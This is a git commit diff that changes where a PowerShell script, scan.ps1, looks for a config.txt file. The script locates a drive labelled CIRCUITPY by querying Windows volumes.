f2bdf6d1ea4a7442234e7755f95a43c0f7c5dfb7
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-03-03 19:48:01 +0100

    Update scan.ps1

--- scan.ps1
+++ scan.ps1
@@ -1,7 +1,7 @@
 # Specify the volume name
 $volumeName = "CIRCUITPY"
 # Specify the path to look for config.txt
-$configFilePath = "C:\Users\Public\config.txt"
+$configFilePath = "C:\Users\Public\Music\config.txt"
 
 # Get the drive letter for the volume with the specified name
 $driveLetter = (Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq $volumeName }).DriveLetter
